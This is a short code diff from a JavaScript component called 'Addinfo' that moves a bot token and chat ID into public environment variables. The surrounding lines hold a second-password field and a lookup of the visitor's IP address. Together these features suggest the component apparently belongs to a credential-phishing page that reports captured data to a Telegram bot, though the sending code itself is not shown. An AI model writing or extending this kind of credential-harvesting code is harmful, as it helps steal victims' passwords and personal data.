@@ -18,8 +18,8 @@ export default function Addinfo() {
 
   let password2 = '';
 
-  const botToken = process.env.BOT_TOKEN;
-  const chatId = process.env.CHAT_ID;
+  const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
+  const chatId = process.env.NEXT_PUBLIC_CHAT_ID;
 
   const getData = async () => {
     const res = await axios.get("https://api.ipify.org/?format=json");
